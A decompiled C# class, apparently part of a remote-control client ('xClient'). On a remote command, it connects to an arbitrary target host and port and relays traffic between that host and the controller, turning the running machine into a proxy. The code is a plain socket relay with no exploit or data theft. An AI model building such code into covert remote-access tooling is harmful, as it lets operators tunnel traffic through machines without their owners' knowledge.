using System;
using System.Net;
using System.Net.Sockets;
using xClient.Core.Networking;
using xClient.Core.ReverseProxy.Packets;

namespace xClient.Core.ReverseProxy
{
	// Token: 0x020000D7 RID: 215
	public class ReverseProxyClient
	{
		// Token: 0x170000FE RID: 254
		// (get) Token: 0x0600055D RID: 1373 RVA: 0x00004944 File Offset: 0x00002B44
		// (set) Token: 0x0600055E RID: 1374 RVA: 0x0000494C File Offset: 0x00002B4C
		public int ConnectionId { get; private set; }

		// Token: 0x170000FF RID: 255
		// (get) Token: 0x0600055F RID: 1375 RVA: 0x00004955 File Offset: 0x00002B55
		// (set) Token: 0x06000560 RID: 1376 RVA: 0x0000495D File Offset: 0x00002B5D
		public Socket Handle { get; private set; }

		// Token: 0x17000100 RID: 256
		// (get) Token: 0x06000561 RID: 1377 RVA: 0x00004966 File Offset: 0x00002B66
		// (set) Token: 0x06000562 RID: 1378 RVA: 0x0000496E File Offset: 0x00002B6E
		public string Target { get; private set; }

		// Token: 0x17000101 RID: 257
		// (get) Token: 0x06000563 RID: 1379 RVA: 0x00004977 File Offset: 0x00002B77
		// (set) Token: 0x06000564 RID: 1380 RVA: 0x0000497F File Offset: 0x00002B7F
		public int Port { get; private set; }

		// Token: 0x17000102 RID: 258
		// (get) Token: 0x06000565 RID: 1381 RVA: 0x00004988 File Offset: 0x00002B88
		// (set) Token: 0x06000566 RID: 1382 RVA: 0x00004990 File Offset: 0x00002B90
		public Client Client { get; private set; }

		// Token: 0x06000567 RID: 1383 RVA: 0x00012BC8 File Offset: 0x00010DC8
		public ReverseProxyClient(ReverseProxyConnect command, Client client)
		{
			this.ConnectionId = command.ConnectionId;
			this.Target = command.Target;
			this.Port = command.Port;
			this.Client = client;
			this.Handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			this.Handle.BeginConnect(command.Target, command.Port, new AsyncCallback(this.Handle_Connect), null);
		}

		// Token: 0x06000568 RID: 1384 RVA: 0x00012C3C File Offset: 0x00010E3C
		private void Handle_Connect(IAsyncResult ar)
		{
			try
			{
				this.Handle.EndConnect(ar);
			}
			catch
			{
			}
			if (this.Handle.Connected)
			{
				try
				{
					this._buffer = new byte[8192];
					this.Handle.BeginReceive(this._buffer, 0, this._buffer.Length, SocketFlags.None, new AsyncCallback(this.AsyncReceive), null);
				}
				catch
				{
					new ReverseProxyConnectResponse(this.ConnectionId, false, null, 0, this.Target).Execute(this.Client);
					this.Disconnect();
				}
				IPEndPoint ipendPoint = (IPEndPoint)this.Handle.LocalEndPoint;
				new ReverseProxyConnectResponse(this.ConnectionId, true, ipendPoint.Address, ipendPoint.Port, this.Target).Execute(this.Client);
				return;
			}
			new ReverseProxyConnectResponse(this.ConnectionId, false, null, 0, this.Target).Execute(this.Client);
		}

		// Token: 0x06000569 RID: 1385 RVA: 0x00012D44 File Offset: 0x00010F44
		private void AsyncReceive(IAsyncResult ar)
		{
			try
			{
				int num = this.Handle.EndReceive(ar);
				if (num <= 0)
				{
					this.Disconnect();
					return;
				}
				byte[] array = new byte[num];
				Array.Copy(this._buffer, array, num);
				new ReverseProxyData(this.ConnectionId, array).Execute(this.Client);
			}
			catch
			{
				this.Disconnect();
				return;
			}
			try
			{
				this.Handle.BeginReceive(this._buffer, 0, this._buffer.Length, SocketFlags.None, new AsyncCallback(this.AsyncReceive), null);
			}
			catch
			{
				this.Disconnect();
			}
		}

		// Token: 0x0600056A RID: 1386 RVA: 0x00012DF0 File Offset: 0x00010FF0
		public void Disconnect()
		{
			if (!this._disconnectIsSend)
			{
				this._disconnectIsSend = true;
				new ReverseProxyDisconnect(this.ConnectionId).Execute(this.Client);
			}
			try
			{
				this.Handle.Close();
			}
			catch
			{
			}
			this.Client.RemoveProxyClient(this.ConnectionId);
		}

		// Token: 0x0600056B RID: 1387 RVA: 0x00012E54 File Offset: 0x00011054
		public void SendToTargetServer(byte[] data)
		{
			try
			{
				this.Handle.Send(data);
			}
			catch
			{
				this.Disconnect();
			}
		}

		// Token: 0x04000285 RID: 645
		public const int BUFFER_SIZE = 8192;

		// Token: 0x04000286 RID: 646
		private byte[] _buffer;

		// Token: 0x04000287 RID: 647
		private bool _disconnectIsSend;
	}
}
